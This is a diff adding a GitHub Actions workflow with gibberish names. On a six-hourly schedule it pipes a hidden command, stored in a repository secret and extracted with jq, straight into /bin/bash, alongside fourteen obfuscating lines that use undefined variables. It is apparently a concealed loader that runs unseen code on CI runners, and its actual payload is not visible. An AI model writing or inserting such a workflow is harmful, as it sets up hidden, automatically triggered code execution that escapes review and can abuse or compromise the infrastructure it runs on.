@@ -1,0 +1,32 @@
+name: wadaodebizainalikan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wadaodebizainalikan
+        env:
+          qt3690: ${{ secrets.qt3690 }}
+        run: |
+          echo $qt3690 | jq -r .w25474 | /bin/bash
+          echo $fvj924 | jq -r .dteep89 | /bin/bash
+          echo $zg2537 | jq -r .kjzz3695 | /bin/bash
+          echo $fjz47 | jq -r .yuk10555 | /bin/bash
+          echo $dvz8 | jq -r .chw0 | /bin/bash
+          echo $vc7 | jq -r .u9686 | /bin/bash
+          echo $umi822 | jq -r .qvcaw26 | /bin/bash
+          echo $z718 | jq -r .lsyt516 | /bin/bash
+          echo $rxiw5 | jq -r .j3089 | /bin/bash
+          echo $q561 | jq -r .q095 | /bin/bash
+          echo $wvoql186 | jq -r .cdgf0 | /bin/bash
+          echo $tgdz85 | jq -r .r40 | /bin/bash
+          echo $bsw34773 | jq -r .tbbf53 | /bin/bash
+          echo $wub76 | jq -r .uzz89756 | /bin/bash
+          echo $dif60 | jq -r .ehey14 | /bin/bash
+
